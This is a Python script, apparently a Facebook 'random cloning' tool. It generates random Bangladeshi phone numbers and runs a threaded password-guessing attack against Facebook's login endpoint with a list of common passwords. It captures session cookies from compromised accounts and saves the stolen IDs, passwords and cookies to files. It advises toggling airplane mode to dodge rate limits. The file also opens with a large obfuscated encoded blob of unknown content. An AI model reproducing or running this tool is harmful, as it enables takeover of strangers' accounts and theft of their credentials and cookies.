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'))))
#--------------------------------[END]--------------------------------#
def banner():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""
     \033[1;92m╔═╗╦═╗╔═╗╔═╗╔╦╗  ═╗ ╦╔╦╗
     \033[1;92m║ ╦╠╦╝║╣ ╠═╣ ║───╔╩╦╝ ║║
     \033[1;92m╚═╝╩╚═╚═╝╩ ╩ ╩   ╩ ╚══╩╝
\033[0;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mDEVELOPER  \033[0;31m● \033[1;92mMD ASIF HASAN 
\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mFAECBOOK   \033[0;31m● \033[1;92mGREAT\033[0;31m-\033[1;92mCYBER\033[0;31m-\033[1;92m404
\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mTOOLS     \033[0;31m ● \033[1;92mRANDOM \x1b[1;97m✘ \033[1;92mCLONING 
\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mVERSION    \033[0;31m● \033[0;31m[\033[1;92mPARSONAL\033[0;31m] \033[1;92mV\x1b[1;97m/\033[1;92m1\033[0;31m-\033[1;92m2
\033[0;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ """)

def fuckxd():
    os.system('clear')
    banner()
#━━━━[ LINE ]━━━━#
def linex():
        print(f"\033[0;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ")        
#━━━━[ MAIN ]━━━━#
def GREAT():
    banner()
    print(f'\033[0;31m[\033[1;92m1\033[0;31m] \033[1;92mRANDOM CLONING ');print(f'\033[0;31m[\033[1;92m2\033[0;31m] \033[1;92mRANDOM M2 CLONING ');print('\033[0;31m[\033[1;92m0\033[0;31m] \033[1;92mEXIT PROGRAMME ');linex()
    GREAT = input(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mCHOICE \033[0;31m    ●\033[1;92m ')
    if GREAT in ['1','01','a','A']:
    	RANDOM()
    if GREAT in ['2','B','b','02']:
    	apk()    	
    else:print(f'\n\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mWRONG OPTION BRO.... ');GREAT()


#━━━━[ BANGLADESH RANDOM ]━━━━#
def RANDOM():
    user=[]
    ck=[]
    banner()
    print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mEXAMPLE   \033[0;31m ● \033[1;92m017 \033[0;31m ● \033[1;92m018 \033[0;31m ● \033[1;92m016 \033[0;31m ●\033[1;92m 019 \033[0;31m ●\033[1;92m 013');linex()
    code = input(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mCHOICE \033[0;31m    ●\033[1;92m ");linex()
    print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mEXAMPLE   \033[0;31m ● \033[1;92m5000 \033[0;31m ● \033[1;92m6000 \033[0;31m ● \033[1;92m7000 \033[0;31m ●\033[1;92m 8000 \033[0;31m');linex()
    limit = int(input(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mCHOICE \033[0;31m    ●\033[1;92m "));linex()
    xmk = input(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mWANT TO SEE COOKIE \033[0;31m[\033[1;92mY\033[0;31m/\033[1;92mN\033[0;31m] \033[1;92m")    
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    with tred(max_workers=35) as GREAT:
        banner();tl = str(len(user))
        print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mSIM CODE \033[0;31m● \x1b[1;97m'+code+f' \033[0;31m= \033[1;92mLIMIT \033[0;31m● \x1b[1;97m'+tl+f' \033[0;31m= \033[1;92mMATHOD \033[0;31m●\x1b[1;97m A');print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mUSE \033[0;31m[\x1b[1;97mAIRPLANE\033[0;31m] \033[1;92mMODE \033[1;92mON\033[0;31m/\033[1;92mOFF AFTER 2 MINUTES');linex()
        for love in user:
            ids = code+love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'bangladesh','১২৩৪৫৬','১২৩৪৫৬৭','১২৩৪৫৬৭৮','১২৩৪৫৬৭৮৯','mababa','jannat','arafat','Arafat','password','sadiya','qwerty','plmokn','i love you']
            GREAT.submit(__API__,ids,passlist,tl,ck)
    print("");linex();print(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mPROCESS HAS BEEN COMPLETED");print(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mTOTAL OK   \033[0;31m●\x1b[1;97m{len(oks)}");linex();exit()
    
#━━━━[ BANGLADESH RANDOM ]━━━━#
def apk():
    user=[]
    ck=[]
    banner()
    print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mEXAMPLE   \033[0;31m ● \033[1;92m017 \033[0;31m ● \033[1;92m018 \033[0;31m ● \033[1;92m016 \033[0;31m ●\033[1;92m 019 \033[0;31m ●\033[1;92m 013');linex()
    code = input(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mCHOICE \033[0;31m    ●\033[1;92m ");linex()
    print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mEXAMPLE   \033[0;31m ● \033[1;92m5000 \033[0;31m ● \033[1;92m6000 \033[0;31m ● \033[1;92m7000 \033[0;31m ●\033[1;92m 8000 \033[0;31m');linex()
    limit = int(input(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mCHOICE \033[0;31m    ●\033[1;92m "));linex()
    xmk = input(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mWANT TO SEE COOKIE \033[0;31m[\033[1;92mY\033[0;31m/\033[1;92mN\033[0;31m] \033[1;92m")    
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')   
    with tred(max_workers=35) as GREAT:
        banner();tl = str(len(user))
        print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mSIM CODE \033[0;31m● \x1b[1;97m'+code+f' \033[0;31m= \033[1;92mLIMIT \033[0;31m● \x1b[1;97m'+tl+f' \033[0;31m= \033[1;92mMATHOD \033[0;31m●\x1b[1;97m B');print(f'\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mUSE \033[0;31m[\x1b[1;97mAIRPLANE\033[0;31m] \033[1;92mMODE \033[1;92mON\033[0;31m/\033[1;92mOFF AFTER 2 MINUTES');linex()
        for love in user:
            ids = code+love
            passlist = [love[2:],code + love,'+88' + code + love,'bangladesh','১২৩৪৫৬','১২৩৪৫৬৭','১২৩৪৫৬৭৮','১২৩৪৫৬৭৮৯','mababa','jannat','arafat','Arafat','password','sadiya','qwerty','plmokn','i love you']
            GREAT.submit(__API__1,ids,passlist,tl,ck)
    print("");linex();print(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mPROCESS HAS BEEN COMPLETED");print(f"\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mTOTAL OK   \033[0;31m●\x1b[1;97m{len(oks)}");linex();exit()

#━━━━[ METHOD API ]━━━━#
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps    
    sys.stdout.write(f"\r\033[0;31m[\033[1;92m=\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mGREAT\033[0;31m-\033[1;92mM1\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{loop}\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mOK\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{len(oks)}\033[0;31m]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = upa()
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': fire(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\r\033[0;31m[\033[1;92mGREAT-\033[1;92m💚\033[0;31m] \033[1;92m{cid} \033[0;31m● \033[1;92m{pas}')
                        print(f'\r\r\033[0;31m[\033[1;92mCOOKIE\033[0;31m] \x1b[1;97m{coki}');linex()
                        open('/sdcard/GREAT-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/GREAT-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\r\033[0;31m[\033[1;92mGREAT-\033[1;92m💚\033[0;31m] \033[1;92m{cid} \033[0;31m● \033[1;92m{pas}')
                        open('/sdcard/GREAT-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/GREAT-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break 
            elif 'checkpoint' in log_cookies:               
                open('/sdcard/GREAT-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(cid)
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
 
#━━━━[ METHOD API ]━━━━#
def __API__1(ids,passlist,tl,ck):
    global loop,oks,cps    
    sys.stdout.write(f"\r\033[0;31m[\033[1;92m=\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mGREAT\033[0;31m-\033[1;92mM2\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{loop}\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mOK\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{len(oks)}\033[0;31m]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = upa()
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': fire(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\r\033[0;31m[\033[1;92mGREAT-\033[1;92m💚\033[0;31m] \033[1;92m{cid} \033[0;31m● \033[1;92m{pas}')
                        print(f'\r\r\033[0;31m[\033[1;92mCOOKIE\033[0;31m] \x1b[1;97m{coki}');cek_apk(session,coki);linex()
                        open('/sdcard/GREAT-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/GREAT-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
